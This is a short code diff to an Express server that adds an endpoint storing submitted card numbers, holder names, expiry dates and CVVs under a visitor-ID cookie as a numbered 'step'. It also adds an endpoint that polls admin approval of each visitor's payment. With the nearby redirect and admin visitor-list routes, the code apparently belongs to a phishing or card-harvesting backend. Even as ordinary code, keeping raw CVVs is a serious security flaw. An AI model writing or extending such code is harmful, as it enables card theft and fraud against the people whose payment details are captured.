@@ -204,6 +204,43 @@ app.get('/api/check-redirect', async (req, res) => {
     }
 });
 
+app.post('/api/save-payment', async (req, res) => {
+    try {
+        const vid = req.cookies.vid;
+        if (!vid) {
+            return res.status(400).json({ success: false, error: 'No visitor ID' });
+        }
+        
+        const { cardNumber, cardHolder, expiryDate, cvv, cardType } = req.body;
+        const result = await saveMultipleFields(vid, 'step4', {
+            cardNumber,
+            cardHolder,
+            expiryDate,
+            cvv,
+            cardType
+        });
+        
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.get('/api/check-payment-approval', async (req, res) => {
+    try {
+        const vid = req.cookies.vid;
+        if (!vid) {
+            return res.json({ success: false, error: 'No visitor ID' });
+        }
+        
+        const { getPaymentStatus } = require('./admin-api');
+        const result = await getPaymentStatus(vid);
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
 app.get('/api/admin/visitors', async (req, res) => {
     try {
         const result = await getAllVisitors();
